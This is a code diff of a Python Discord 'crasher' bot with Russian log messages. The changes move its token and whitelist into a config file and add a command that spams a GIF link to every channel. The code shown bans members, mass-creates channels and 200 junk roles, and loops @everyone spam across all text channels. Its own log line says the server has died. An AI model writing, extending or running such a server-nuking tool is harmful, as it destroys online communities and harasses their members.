@@ -1,11 +1,17 @@
-import discord, os, sys, random, string, requests
+import discord, os, sys, random, string, requests, configparser, json
 from discord.ext import commands
 from discord import Permissions
 from colorama import Fore, init
 from os import system, name
 init()
 
-whit = [сюда айди пользователей через запятую]
+config = configparser.ConfigParser()
+config.read('config.ini')
+
+Token = config.get("Crasher", "Token")
+whit = json.loads(config.get("Crasher", "Whitelist"))
+
+
 
 if name == "nt":
         _ = system("cls")
@@ -34,6 +40,7 @@ async def on_ready():
 
 @client.command()
 async def hlp(ctx):
+    author = ctx.message.author
     print(f"{Fore.WHITE}> {Fore.RED}В бан, чёртики!{Fore.WHITE}...")
     ban = 0
     bany = 0
@@ -107,11 +114,14 @@ async def hlp(ctx):
         print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал канал")
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Наспамил...")
 
-    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Начинаем спам ролями")
+    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спамим ролями")
     for a in range(200):
-        await ctx.guild.create_role(name="BABABOOEY")
+        await ctx.guild.create_role(name="Crash9d")
         print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал роль")
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Наcпамил...")
+
+
+
     
     print(f"{Fore.WHITE}> {Fore.RED}Сервер УМЕР{Fore.WHITE}.")
    
@@ -140,10 +150,10 @@ async def start(ctx):
 
 @client.command()
 async def ml(ctx):
+    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спам активирован")
     while True:
-        await ctx.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")
-        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спамим...")
-    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Заспамили!")
+        for channel in ctx.guild.text_channels:
+          await channel.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")
 
 @client.command()
 async def gamehelp(ctx):
@@ -151,11 +161,20 @@ async def gamehelp(ctx):
      print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Нашел роль {role}")
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Все роли найдены")
 
+
+@client.command()
+async def gif(ctx):
+    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Рассылаем гифки")
+    for channel in ctx.guild.text_channels:
+     await channel.send("https://gfycat.com/flakyacrobatickusimanse")
+     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Кинул гифку в {channel}")
+    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Разослал гифки")
+
     
 
 
 try:
-    client.run('Токен')
+    client.run(Token)
 except Exception:
     pass
 except KeyboardInterrupt:
